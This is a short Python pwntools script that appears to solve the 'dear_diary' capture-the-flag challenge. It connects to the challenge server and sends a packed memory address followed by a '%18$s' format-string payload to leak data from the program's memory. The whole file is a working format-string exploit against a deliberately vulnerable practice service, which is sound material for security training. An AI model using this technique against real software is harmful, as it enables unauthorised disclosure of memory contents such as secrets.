#!/usr/bin/env python

from pwn import *

#p = process('./dear_diary')
p = remote('diary.vuln.icec.tf', port=6501)
print(p.recv())
p.sendline('1')
print(p.recv())
p.sendline(pack(0x0804a0a0) + '%18$s,')
print(p.recv())
p.sendline('2')
print(p.recv())
print(p.recv())
